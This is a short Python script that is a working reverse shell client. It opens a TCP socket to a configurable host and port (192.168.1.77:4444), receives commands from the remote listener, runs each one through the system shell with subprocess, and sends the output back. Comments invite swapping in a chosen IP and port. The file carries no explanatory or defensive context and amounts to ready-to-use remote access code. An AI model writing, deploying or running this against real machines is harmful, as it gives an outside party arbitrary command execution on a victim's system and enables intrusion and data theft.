import socket
import subprocess
import os

# Define the IP address and port number
HOST = '192.168.1.77'  # Replace with the desired IP address
PORT = 4444  # Replace with the desired port number

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    while True:
        # Receive command from the server
        command = s.recv(1024).decode('utf-8')

        # If 'exit' command is received, break the loop
        if command.lower() == 'exit':
            break

        # Execute the command
        if command.startswith('cd '):
            try:
                os.chdir(command[3:])
                s.send(b'Changed directory successfully\n')
            except Exception as e:
                s.send(str(e).encode('utf-8') + b'\n')
        else:
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr

            # Send the result back to the server
            s.send(result.encode('utf-8'))

    # Close the connection
    s.close()

if __name__ == '__main__':
    connect()
